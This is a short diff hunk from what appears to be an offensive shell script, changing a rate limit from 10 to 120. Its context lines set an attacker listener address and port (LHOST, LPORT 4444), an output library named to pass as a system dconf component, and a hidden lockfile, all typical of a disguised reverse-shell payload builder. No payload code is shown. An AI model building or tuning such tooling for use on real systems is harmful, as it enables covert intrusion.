@@ -4,7 +4,7 @@ LHOST="${LHOST:-}"
 LPORT="${LPORT:-4444}"
 OUT_FILE="libdconf-update.so"
 LOCKFILE="/var/tmp/.dconf-lock"
-RATE_LIMIT=10
+RATE_LIMIT=120
 
 if [[ -z "$LHOST" ]]; then
     echo "[-] LHOST is not set. Export it before running."
